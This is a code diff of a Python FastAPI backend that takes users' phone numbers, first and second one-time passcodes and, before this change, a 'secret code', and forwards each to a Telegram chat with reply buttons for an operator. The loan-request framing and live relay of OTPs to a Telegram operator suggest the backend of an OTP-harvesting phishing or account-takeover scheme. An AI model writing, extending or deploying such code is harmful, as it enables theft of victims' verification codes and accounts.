@@ -22,9 +22,10 @@ app.add_middleware(
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
+# In-memory databases
 LOAN_REQUESTS = {}
 OTP_REQUESTS = {}
-SECOND_VERIFICATION_REQUESTS = {} # ✅ NEW
+SECOND_VERIFICATION_REQUESTS = {}
 
 # --- KEEP-ALIVE BACKGROUND TASK ---
 async def self_ping():
@@ -53,10 +54,10 @@ class OTPRequest(BaseModel):
     phone_number: str
     otp_code: str
 
-class SecondVerificationRequest(BaseModel): # ✅ NEW
+# ✅ UPDATED: Removed secret_code from the model
+class SecondVerificationRequest(BaseModel):
     phone_number: str
     second_otp: str
-    secret_code: str
 
 class LoanRequest(BaseModel):
     phone_number: str
@@ -105,7 +106,7 @@ async def get_otp_status(otp_id: str):
         raise HTTPException(status_code=404, detail="OTP not found")
     return {"status": OTP_REQUESTS[otp_id]}
 
-# ✅ NEW ENDPOINT FOR SECOND VERIFICATION
+# ✅ UPDATED: Second verification no longer expects a secret code
 @app.post("/api/verify-second-otp")
 async def verify_second_otp(data: SecondVerificationRequest):
     verify_id = str(uuid.uuid4())
@@ -118,8 +119,7 @@ async def verify_second_otp(data: SecondVerificationRequest):
             "text": (
                 f"🔐 <b>2nd Verification</b>\n\n"
                 f"📱 Phone: {data.phone_number}\n"
-                f"🔢 2nd OTP: <code>{data.second_otp}</code>\n"
-                f"🤫 Secret Code: <code>{data.secret_code}</code>"
+                f"🔢 2nd OTP: <code>{data.second_otp}</code>"
             ),
             "parse_mode": "HTML",
             "reply_markup": {
